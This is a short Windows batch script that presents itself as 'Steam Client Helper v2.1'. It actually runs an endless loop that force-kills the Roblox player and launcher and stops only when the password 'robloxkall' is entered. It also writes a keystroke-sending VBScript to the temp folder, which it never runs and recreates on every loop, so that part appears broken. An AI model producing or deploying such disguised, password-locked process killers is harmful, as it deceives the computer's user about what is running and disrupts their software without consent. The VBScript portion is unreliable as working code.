@echo off
title Steam Client Helper
color 06
echo Steam Client Helper v2.1 - Running...
echo.

:KILLLOOP
tasklist /FI "IMAGENAME eq RobloxPlayerBeta.exe" 2>nul | find /I "RobloxPlayerBeta.exe" >nul
if %errorlevel%==0 (
    taskkill /F /IM RobloxPlayerBeta.exe >nul 2>&1
    taskkill /F /IM RobloxPlayerLauncher.exe >nul 2>&1
    echo Roblox killed.
)
timeout /t 1 >nul

echo set WshShell = CreateObject("WScript.Shell") > "%temp%\keycheck.vbs"
echo Do >> "%temp%\keycheck.vbs"
echo     If WshShell.AppActivate("Steam Client Helper") Then >> "%temp%\keycheck.vbs"
echo         key = WshShell.SendKeys("~") >> "%temp%\keycheck.vbs"
echo     End If >> "%temp%\keycheck.vbs"
echo     WScript.Sleep 500 >> "%temp%\keycheck.vbs"
echo Loop >> "%temp%\keycheck.vbs"

set /p pass="Enter password to stop: "
if "%pass%"=="robloxkall" goto END
echo Wrong password!
goto KILLLOOP

:END
del "%temp%\keycheck.vbs" >nul 2>&1
echo Unlocked.
pause
exit
